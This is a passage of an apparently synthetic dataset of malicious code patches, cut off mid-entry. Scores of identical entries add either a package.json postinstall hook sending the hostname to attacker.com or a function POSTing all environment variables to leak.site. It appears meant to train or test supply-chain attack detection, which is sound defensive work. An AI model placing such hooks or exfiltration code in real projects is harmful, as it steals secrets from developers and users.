+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-93",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-94",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-95",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-96",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-97",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-98",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-99",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-SC-100",
+    "repo": "expressjs/express",
+    "filename": "package.json",
+    "patch": "@@ -5,5 +5,5 @@\n-  \"scripts\": { \"test\": \"mocha\" }\n+  \"scripts\": { \"postinstall\": \"node -e \\\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\\"\" }"
+  },
+  {
+    "id": "MAL-EX-1",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-2",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-3",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-4",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-5",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-6",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-7",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-8",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-9",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-10",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-11",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-12",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-13",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-14",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-15",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-16",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-17",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-18",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-19",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-20",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-21",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-22",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-23",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-24",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-25",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-26",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-27",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-28",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-29",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-30",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-31",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-32",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-33",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-34",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-35",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-36",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-37",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-38",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-39",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-40",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-41",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-42",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-43",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-44",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-45",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-46",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-47",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-48",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-49",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-50",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-51",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-52",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-53",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-54",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-55",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-56",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-57",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-58",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-59",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-60",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-61",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-62",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-63",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-64",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-65",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-66",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-67",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-68",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-69",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-70",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-71",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-72",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-73",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-74",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-75",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-76",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-77",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-78",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-79",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-80",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-81",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-82",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-83",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-84",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
